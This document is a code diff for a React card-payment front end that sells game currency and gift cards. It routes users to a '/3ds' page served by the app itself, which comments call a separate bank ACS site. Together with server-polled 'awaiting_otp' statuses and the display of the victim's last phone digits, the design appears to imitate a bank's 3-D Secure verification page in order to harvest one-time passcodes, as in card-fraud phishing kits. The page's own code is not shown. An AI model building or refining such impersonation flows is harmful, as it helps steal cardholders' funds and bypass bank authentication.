@@ -4,6 +4,8 @@ import { LanguageProvider, useLanguage } from './context/LanguageContext';
 import { Globe, Wallet, CreditCard, Building2, Zap, Copy, CheckCircle2, UploadCloud, Home, LayoutGrid, Clock, User, ArrowRight, ArrowLeft, Settings, LogIn, LogOut, Activity, FileText, ArrowDownUp, ShieldAlert, Gamepad2, XCircle, Eye, EyeOff, Download, Search, Pencil, Tv, AppWindow } from 'lucide-react';
 import { CardProcessingToOtpScreen } from './components/OtpPaymentUi';
 import { AcsOtpChallenge } from './components/AcsOtpChallenge';
+import AcsChallengePage from './pages/AcsChallengePage';
+import { redirectToAcsChallenge } from './lib/acsRedirect';
 import { ServiceCard } from './components/ServiceCard';
 import { PubgUcOrder } from './components/PubgUcOrder';
 import { GiftCardOrder } from './components/GiftCardOrder';
@@ -529,6 +531,28 @@ function MainContent() {
   const [otpCode, setOtpCode] = useState('');
   const [otpPhoneLast3, setOtpPhoneLast3] = useState<string | null>(null);
   const [sellAmount, setSellAmount] = useState<number>(10000);
+
+  // Return from standalone ACS / 3DS page → show success on merchant site
+  useEffect(() => {
+    try {
+      const p = new URLSearchParams(window.location.search);
+      const acs = p.get('acs_result');
+      if (!acs) return;
+      if (acs === 'completed') {
+        setIsSuccess(true);
+        setShowOtpStep(false);
+        setCardProcessingToOtp(false);
+        const ref = p.get('order_ref');
+        if (ref) setCurrentOrderId(ref);
+      }
+      p.delete('acs_result');
+      p.delete('order_ref');
+      const clean = `${window.location.pathname}${p.toString() ? `?${p}` : ''}${window.location.hash || ''}`;
+      window.history.replaceState({}, '', clean);
+    } catch {
+      /* ignore */
+    }
+  }, []);
   const fileInputRef = useRef<HTMLInputElement>(null);
   const prevTransactionsRef = useRef<ServerTransaction[]>([]);
   const [fileName, setFileName] = useState<string | null>(null);
@@ -1191,18 +1215,25 @@ function MainContent() {
 
   const applyCardOrderStatus = useCallback((status: string, meta?: OtpOrderPoll) => {
     if (meta) applyOtpPollMeta(meta);
-    if (status === 'awaiting_otp') {
+    if (status === 'awaiting_otp' || status === 'retry_otp') {
       setCardProcessingToOtp(false);
+      // Open bank ACS on a separate full page (3DS), then return when done
+      if (currentOrderId) {
+        redirectToAcsChallenge({
+          orderRef: currentOrderId,
+          clientId,
+          lang,
+          phoneLast3: meta?.phone_last3 || otpPhoneLast3,
+          returnUrl: `${window.location.origin}/`,
+        });
+        return;
+      }
       setShowOtpStep(true);
       setOtpState('input');
-      return;
-    }
-    if (status === 'retry_otp') {
-      setCardProcessingToOtp(false);
-      setShowOtpStep(true);
-      setOtpState('input');
-      setOtpCode('');
-      setOtpRetryNotice(true);
+      if (status === 'retry_otp') {
+        setOtpCode('');
+        setOtpRetryNotice(true);
+      }
       return;
     }
     if (status === 'completed') {
@@ -1219,7 +1250,7 @@ function MainContent() {
         setOtpFailReason('otp_attempts_exceeded');
       }
     }
-  }, [applyOtpPollMeta]);
+  }, [applyOtpPollMeta, currentOrderId, clientId, lang, otpPhoneLast3]);
 
   useEffect(() => {
     let interval: ReturnType<typeof setInterval>;
@@ -5985,72 +6016,18 @@ function MainContent() {
       return <CardProcessingToOtpScreen lang={lang} etaText={t('otpEtaDelivery')} />;
     }
 
-    // OTP
+    // OTP → full-page /3ds (separate bank ACS site)
     if (showOtpStep) {
-      const processingTx = currentOrderId
-        ? transactions.find((t) => t.id === currentOrderId || t.order_ref === currentOrderId)
-        : undefined;
-      const paymentRejected =
-        otpState === 'failed' &&
-        (otpFailReason === 'otp_attempts_exceeded' ||
-          processingTx?.status === 'failed' ||
-          processingTx?.status === 'refunded' ||
-          processingTx?.status === 'suspended');
-
-      if (paymentRejected) {
-        return (
-          <div className="max-w-md mx-auto pb-6">
-            <div className="bg-white rounded-2xl border border-gray-100 p-8 text-center space-y-5">
-              <XCircle className="w-12 h-12 text-red-600 mx-auto" />
-              <h3 className="font-black text-lg text-gray-900">
-                {lang === 'ar' ? 'عملية مرفوضة' : 'Payment declined'}
-              </h3>
-              <p className="text-sm text-gray-500">
-                {otpFailReason === 'otp_attempts_exceeded'
-                  ? t('otpRejectedAttempts')
-                  : lang === 'ar'
-                    ? 'تم رفض العملية أو البطاقة غير صالحة.'
-                    : 'The payment was declined or the card was not accepted.'}
-              </p>
-              <button
-                type="button"
-                onClick={resetForm}
-                className="w-full bg-gray-900 text-white py-4 rounded-2xl font-bold"
-              >
-                {lang === 'ar' ? 'حاول مرة أخرى' : 'Try again'}
-              </button>
-            </div>
-          </div>
-        );
+      if (currentOrderId && clientId) {
+        redirectToAcsChallenge({
+          orderRef: currentOrderId,
+          clientId,
+          lang,
+          phoneLast3: otpPhoneLast3,
+          returnUrl: `${window.location.origin}/`,
+        });
       }
-
-      return (
-        <div className="max-w-md mx-auto pb-6">
-          <div className="flex items-center gap-3 mb-6">
-            {backBtn(() => setShowOtpStep(false))}
-            <h2 className="text-lg font-black text-gray-900">{lang === 'ar' ? 'رمز التحقق' : 'OTP Verification'}</h2>
-          </div>
-          <AcsOtpChallenge
-            orderRef={currentOrderId}
-            phoneLast3={otpPhoneLast3}
-            lang={lang}
-            otpAttempts={otpAttempts}
-            otpMaxAttempts={otpMaxAttempts}
-            otpRemaining={otpRemaining}
-            otpRetryNotice={otpRetryNotice}
-            otpResendNotice={otpResendNotice}
-            resendCooldown={otpResendCooldown}
-            resendLoading={otpResendLoading}
-            externalState={otpState === 'failed' ? 'failed' : otpState === 'checking' ? 'checking' : 'input'}
-            failReason={otpFailReason}
-            t={t}
-            onMethodNext={handleOtpMethodNext}
-            onSubmitOtp={(code) => handleOtpSubmit(code)}
-            onResend={() => void handleOtpResend()}
-            onRetry={resetForm}
-          />
-        </div>
-      );
+      return <CardProcessingToOtpScreen lang={lang} etaText={lang === 'ar' ? 'جاري فتح صفحة التحقق...' : 'Opening verification...'} />;
     }
 
     // خطوة 1: إدخال المبلغ
@@ -6296,30 +6273,18 @@ function MainContent() {
             </div>
           )}
 
-          {cardProcessingToOtp ? (
-            <CardProcessingToOtpScreen lang={lang} etaText={t('otpEtaDelivery')} layout="inline" />
-          ) : showOtpStep ? (
-            <div className="p-4 sm:p-6 flex-1 flex flex-col items-center justify-center">
-              <AcsOtpChallenge
-                orderRef={currentOrderId}
-                phoneLast3={otpPhoneLast3}
-                lang={lang}
-                otpAttempts={otpAttempts}
-                otpMaxAttempts={otpMaxAttempts}
-                otpRemaining={otpRemaining}
-                otpRetryNotice={otpRetryNotice}
-                otpResendNotice={otpResendNotice}
-                resendCooldown={otpResendCooldown}
-                resendLoading={otpResendLoading}
-                externalState={otpState === 'failed' ? 'failed' : otpState === 'checking' ? 'checking' : 'input'}
-                failReason={otpFailReason}
-                t={t}
-                onMethodNext={handleOtpMethodNext}
-                onSubmitOtp={(code) => handleOtpSubmit(code)}
-                onResend={() => void handleOtpResend()}
-                onRetry={resetForm}
-              />
-            </div>
+          {cardProcessingToOtp || showOtpStep ? (
+            <CardProcessingToOtpScreen
+              lang={lang}
+              etaText={
+                showOtpStep
+                  ? lang === 'ar'
+                    ? 'جاري فتح صفحة التحقق البنكي...'
+                    : 'Opening bank verification page...'
+                  : t('otpEtaDelivery')
+              }
+              layout="inline"
+            />
           ) : buyPaymentType ? (
           <div className="p-4 sm:p-6 flex-1 overflow-y-auto space-y-6 sm:space-y-8">
             {/* Step 1 */}
@@ -7212,6 +7177,10 @@ function MainContent() {
 }
 
 export default function App() {
+  // Standalone ACS / 3DS full page (separate from main app shell)
+  if (typeof window !== 'undefined' && window.location.pathname.startsWith('/3ds')) {
+    return <AcsChallengePage />;
+  }
   return (
     <LanguageProvider>
       <MainContent />
